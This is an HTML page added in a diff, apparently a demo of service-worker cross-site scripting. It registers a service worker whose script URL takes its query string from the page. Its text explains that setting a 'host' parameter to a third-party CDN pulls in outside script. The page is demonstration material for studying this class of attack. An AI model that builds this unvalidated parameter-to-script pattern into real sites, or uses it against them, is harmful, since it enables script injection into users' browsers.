@@ -1,0 +1,34 @@
+<!doctype html><html>
+  <head><meta charset=utf-8><meta name=viewport content="width=device-width, initial-scale=1">
+   <head>
+    <title>SW_Demo</title><meta name=theme-color content=#2e3aa1>
+    <link rel=manifest href=../../manifest2.json>
+    <link rel="shortcut icon" href=../../images/logo-32x32.png>
+    <link rel=stylesheet href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <link rel=stylesheet href=https://storage.googleapis.com/code.getmdl.io/1.0.6/material.indigo-pink.min.css>    
+    <script src=https://storage.googleapis.com/code.getmdl.io/1.0.6/material.min.js></script>
+    <link rel=stylesheet href=../../styles/main.css>
+   <script type='text/javascript'>
+	window.location = '/index.html?host=https://demopwa.github.io'
+	function register_sw(){
+		// /xssdemo/SW_XSS/
+		navigator.serviceWorker.register('./xss_sw.js'+window.location.search).then(function(registration) {
+			console.log('Service worker registration succeeded:', registration);
+		  }, /*catch*/ function(error) {
+			console.log('Service worker registration failed:', error);
+		  });				
+	}
+    	register_sw()
+    </script>
+  </head>
+<body><div class="mdl-layout mdl-js-layout mdl-layout--fixed-header">
+  <header class=mdl-layout__header><div class=mdl-layout__header-row><span class=mdl-layout-title>SW XSS Demo</span><div class=mdl-layout-spacer></div>
+   </div></header>
+    <main>
+	<h3>Please note the host parameter in the URL query string. It can be set to 'https://cdn.onesignal.com/' to perform XSS attack that includes script from third-party site 
+		https://cdn.onesignal.com  </h3>
+	    
+	    <p>Check Console Logs to know if XSS attack was success</p>    
+    </main>
+  </script>
+</body></html>
